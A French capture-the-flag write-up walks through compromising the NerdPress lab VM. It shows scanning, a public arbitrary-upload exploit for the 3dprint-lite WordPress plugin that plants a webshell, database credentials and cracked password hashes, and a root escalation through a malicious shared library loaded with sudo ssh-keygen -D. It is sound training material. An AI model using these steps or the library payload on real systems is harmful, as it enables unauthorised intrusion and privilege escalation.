# Solution du CTF NerdPress de iamv1nc3nt

YetAnotherPress
---------------

Le CTF NerdPress disponible sur [iamv1nc3nt.com](https://iamv1nc3nt.com/) se présente comme un CTF de difficulté intermédaire. Allons voir ça de plus près.  

```plain
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 2e:9f:a8:fd:d2:23:7f:7c:9b:9c:17:1c:1c:98:eb:50 (RSA) 
|   256 6a:43:6a:3d:e0:72:fd:6a:4c:04:c2:bb:95:5d:3e:c4 (ECDSA) 
|_  256 b8:7f:5f:a5:2d:44:41:c0:d1:dd:e2:f5:06:ed:6f:c6 (ED25519) 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
|_http-generator: WordPress 5.8.3 
|_http-title: NerdPress – Just another WordPress site 
MAC Address: 08:00:27:70:6E:42 (Oracle VirtualBox virtual NIC) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sans trop de surprises par rapport au nom du challenge on trouve un CMS Wordpress.  

J'ai pris l'habitude de regarder si le dossier des uploads (*/wp-content/uploads*) est listable et là c'est le cas. Chose étrange on y trouve un dossier baptisé *p3d* alors que d'habitude on ne voit que des noms de dossiers correspondant à des années.  

Le site mentionne un nom d'hôte spécifique que j'ai passé à *wpscan* tout comme le mode d'énumération *aggressive* pour être sûr d'obtenir des résultats exhaustifs :  

```bash
$ docker run --add-host nerdpress:192.168.56.27 -it --rm wpscanteam/wpscan --url http://nerdpress/ -e ap,at,cb,dbe --plugins-detection aggressive
```

Deux plugins sont présents sur ce blog :  

```plain
[i] Plugin(s) Identified: 

[+] 3dprint-lite 
 | Location: http://nerdpress/wp-content/plugins/3dprint-lite/ 
 | Last Updated: 2021-10-14T13:53:00.000Z 
 | Readme: http://nerdpress/wp-content/plugins/3dprint-lite/readme.txt 
 | [!] The version is out of date, the latest version is 1.9.3 
 | 
 | Found By: Known Locations (Aggressive Detection) 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/, status: 200 
 | 
 | Version: 1.9.1.4 (100% confidence) 
 | Found By: Query Parameter (Passive Detection) 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/css/3dprint-lite-frontend.css?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/ProgressButtonStyles/css/component.css?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/noUiSlider/nouislider.min.css?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/easyaspie/assets/css/main.css?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/ProgressButtonStyles/js/modernizr.custom.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/three.min.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/Detector.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/Mirror.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/controls/OrbitControls.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/renderers/CanvasRenderer.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/renderers/Projector.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/loaders/STLLoader.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/loaders/OBJLoader.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threejs/js/loaders/MTLLoader.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threex/threex.dilategeometry.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threex/threex.atmospherematerial.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/threex/threex.geometricglowmesh.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/plupload/plupload.full.min.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/ProgressButtonStyles/js/classie.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/ProgressButtonStyles/js/progressButton.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/event-manager/event-manager.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/accounting/accounting.min.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/noUiSlider/nouislider.min.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/easyaspie/assets/js/superfish.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/easyaspie/assets/js/easyaspie.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/ext/jquery-cookie/jquery.cookie.min.js?ver=1.9.1.4 
 |  - http://nerdpress/wp-content/plugins/3dprint-lite/includes/js/3dprint-lite-frontend.js?ver=1.9.1.4 

[+] akismet 
 | Location: http://nerdpress/wp-content/plugins/akismet/ 
 | Last Updated: 2022-01-24T16:11:00.000Z 
 | Readme: http://nerdpress/wp-content/plugins/akismet/readme.txt 
 | [!] The version is out of date, the latest version is 4.2.2 
 | 
 | Found By: Known Locations (Aggressive Detection) 
 |  - http://nerdpress/wp-content/plugins/akismet/, status: 200 
 | 
 | Version: 4.2.1 (100% confidence) 
 | Found By: Readme - Stable Tag (Aggressive Detection) 
 |  - http://nerdpress/wp-content/plugins/akismet/readme.txt 
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) 
 |  - http://nerdpress/wp-content/plugins/akismet/readme.txt
```

Le *3dprint-lite* correspond au dossier *3dp* que l'on a vu plus tôt. Ce plugin est aussi vulnérable [à une faille d'upload arbitraire](https://www.exploit-db.com/exploits/50321) sans authentification préalable !  

L'exploit nous obtient un webshell les doigts dans ta sœur :  

```plain
$ python3 3dprint.py http://nerdpress myshell.php 
3DPrint Lite <= 1.9.1.4 - Arbitrary File Upload 
Author -> spacehen (www.github.com/spacehen) 
Uploading Shell... 
Shell Uploaded! 
http://nerdpress/wp-content/uploads/p3d/myshell.php
```

Wozilla
-------

Une fois un ReverseSSH établit je commence par récupérer les identifiants dans la fichier de configuration du Wordpress :  

```plain
/** The name of the database for WordPress */ 
define( 'DB_NAME', 'wordpress' ); 

/** MySQL database username */ 
define( 'DB_USER', 'webuser' ); 

/** MySQL database password */ 
define( 'DB_PASSWORD', 'GT66pR7816' ); 

/** MySQL hostname */ 
define( 'DB_HOST', 'localhost' ); 

/** Database charset to use in creating database tables. */ 
define( 'DB_CHARSET', 'utf8mb4' );
```

Il y a différents utilisateurs sur le wordpress :  

```plain
mysql> select * from wp_users;  
+----+------------+------------------------------------+---------------+----------------------+------------------+---------------------+---------------------+-------------+---------------+ 
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url         | user_registered     | user_activation_key | user_status | display_name  | 
+----+------------+------------------------------------+---------------+----------------------+------------------+---------------------+---------------------+-------------+---------------+ 
|  1 | admin      | $P$BV7kJ2OkZLffVaX4TGeEyDRmS6xTuL/ | admin         | admin@example.com    | http://nerdpress | 2022-01-20 19:50:34 |                     |           0 | admin         | 
|  2 | bgates     | $P$Bmj3.4ODmeffIV6hu/qhHTjI5tZ8Em/ | bgates        | bgates@example.com   |                  | 2022-01-20 20:52:37 |                     |           0 | Bill Gates    | 
|  3 | sjobs      | $P$BnovC0hZWOV/GmkDYvcJjsKTa0zDZW1 | sjobs         | sjobs@example.com    |                  | 2022-01-20 20:53:39 |                     |           0 | Steve Jobs    | 
|  4 | swozniak   | $P$Bx9aLfMHwSzWdZm0fwSNQyB8cEr7Uc/ | swozniak      | swozniak@example.com |                  | 2022-01-20 20:54:24 |                     |           0 | Steve Wozniak | 
|  5 | pallen     | $P$Bb9ECl53eqtuyJURHJ/8KrzIYVukpN0 | pallen        | pallen@example.com   |                  | 2022-01-20 20:55:06 |                     |           0 | Paul Allen    | 
+----+------------+------------------------------------+---------------+----------------------+------------------+---------------------+---------------------+-------------+---------------+ 
5 rows in set (0.00 sec)
```

Evidemment cela ne nous sert à rien de casser ces hashs à moins qu'ils soient utilisés aussi pour des comptes locaux :  

```plain
www-data@nerdpress:/var/www/html$ cat /etc/passwd | grep home 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
nerd:x:1000:1000:nerd:/home/nerd:/bin/bash 
bgates:x:1001:1001:,,,:/home/bgates:/bin/bash 
sjobs:x:1002:1002:,,,:/home/sjobs:/bin/bash 
swozniak:x:1003:1003:,,,:/home/swozniak:/bin/bash 
pallen:x:1004:1004:,,,:/home/pallen:/bin/bash
```

C'est d'autant plus intéressant que les permissions ne nous laissent rien voir :  

```plain
drwx------  2 bgates   bgates   4096 Jan 20 21:19 bgates 
drwx------  3 nerd     nerd     4096 Jan 20 21:39 nerd 
drwx------  2 pallen   pallen   4096 Jan 20 22:32 pallen 
drwx------  2 sjobs    sjobs    4096 Jan 20 21:39 sjobs 
drwx------  3 swozniak swozniak 4096 Jan 20 22:33 swozniak
```

A l'aide de [PengLab](https://github.com/mxrch/penglab) j'ai cassé quatre de ces hashs :  

```plain
$P$Bmj3.4ODmeffIV6hu/qhHTjI5tZ8Em/:liverpool08
$P$Bb9ECl53eqtuyJURHJ/8KrzIYVukpN0:mariaisabel
$P$BnovC0hZWOV/GmkDYvcJjsKTa0zDZW1:ilovebill
$P$Bx9aLfMHwSzWdZm0fwSNQyB8cEr7Uc/:jazzy123
```

Ces mots de passe ne fonctionnent pas avec SSH (je les ai testé avec THC-Hydra) mais sont acceptés via la commande *su*.  

Les comptes *bgates* et *sjobs* ne contiennent rien d'intéressant mais *pallen* peut obtenir un shell pour *swozniak*, le seul pour qui l'on ne disposait pas de mot de passe fonctionnel.  

```plain
pallen@nerdpress:/var/www/html$ sudo -l 
Matching Defaults entries for pallen on nerdpress: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User pallen may run the following commands on nerdpress: 
    (swozniak) NOPASSWD: /usr/bin/bash
pallen@nerdpress:/var/www/html$ sudo -u swozniak /usr/bin/bash 
swozniak@nerdpress:/var/www/html$ cd 
swozniak@nerdpress:~$ ls -al 
total 28 
drwx------ 3 swozniak swozniak 4096 Jan 20 22:33 . 
drwxr-xr-x 7 root     root     4096 Jan 20 22:16 .. 
lrwxrwxrwx 1 swozniak swozniak    9 Jan 20 21:38 .bash_history -> /dev/null 
-rw-r--r-- 1 swozniak swozniak  220 Jan 20 21:18 .bash_logout 
-rw-r--r-- 1 swozniak swozniak 3771 Jan 20 21:18 .bashrc 
drwx------ 2 swozniak swozniak 4096 Jan 20 21:38 .cache 
-rw-r--r-- 1 swozniak swozniak  807 Jan 20 21:18 .profile 
-rw------- 1 swozniak swozniak   12 Jan 20 22:15 .wozpazz
swozniak@nerdpress:~$ cat .wozpazz  
123123jazzy 
```

GTFO
----

Via ce mot de passe on peut obtenir la liste des commandes sudo autorisées :  

```plain
swozniak@nerdpress:~$ sudo -l 
[sudo] password for swozniak:  
Matching Defaults entries for swozniak on nerdpress: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User swozniak may run the following commands on nerdpress: 
    (root) /usr/bin/ssh-keygen
```

Evidemment si on peut utiliser *ssh-keygen* on peut créer une nouvelle clé pour root et c'est dans la poche, hmm ?  

Seulement la clé privée n'est pas affichée dans la console donc une fois la clé générée on ne peut pas la lire et je n'ai pas vu d'options dans la page de manuel qui provoquerait cet affichage ou effectuerait une backup de cette clé.  

Je m'en suis donc remis au site *GTFObins* [qui propose d'utiliser l'option -D du binaire permettant de charger une librairie](https://gtfobins.github.io/gtfobins/ssh-keygen/).  

J'avais réalisé une exploitation assez proche sur le CTF [/dev/random: k2 de VulnHub](http://devloop.users.sourceforge.net/index.php?article154/solution-du-ctf-dev-random-k2-de-vulnhub).  

J'ai écrit le code suivant :  

```c
#include <stdlib.h> 

void _init(void) { 
  system("/usr/bin/bash -p"); 
}
```

Compilé en local faute de gcc sur la VM :  

```bash
gcc -fPIC -c mylib.c
ld -shared -o mylib.so mylib.o
```

Une fois uploadé via sftp avec le tunnel ReveseSSH il ne reste plus qu'à passer root :  

```plain
swozniak@nerdpress:~$ sudo /usr/bin/ssh-keygen -D /tmp/mylib.so  
root@nerdpress:/home/swozniak# id 
uid=0(root) gid=0(root) groups=0(root) 
root@nerdpress:/home/swozniak# cd /root 
root@nerdpress:~# ls 
root.txt  snap 
root@nerdpress:~# cat root.txt 

 _______                   ._____________                                
 \      \   ___________  __| _/\______   \_______   ____   ______ ______ 
 /   |   \_/ __ \_  __ \/ __ |  |     ___/\_  __ \_/ __ \ /  ___//  ___/ 
/    |    \  ___/|  | \/ /_/ |  |    |     |  | \/\  ___/ \___ \ \___ \  
\____|__  /\___  >__|  \____ |  |____|     |__|    \___  >____  >____  > 
        \/     \/           \/                         \/     \/     \/  
           __________               __             .___                  
           \______   \ ____   _____/  |_  ____   __| _/                  
            |       _//  _ \ /  _ \   __\/ __ \ / __ |                   
            |    |   (  <_> |  <_> )  | \  ___// /_/ |                   
            |____|_  /\____/ \____/|__|  \___  >____ |                   
                   \/                        \/     \/                   

c5eed2ebdbdc75c24b31448dae79a6dc

root@nerdpress:/home/nerd# exit 
dlsym(C_GetFunctionList) failed: /tmp/mylib.so: undefined symbol: C_GetFunctionList 
cannot read public key from pkcs11
```


*Published February 11 2022 at 09:18*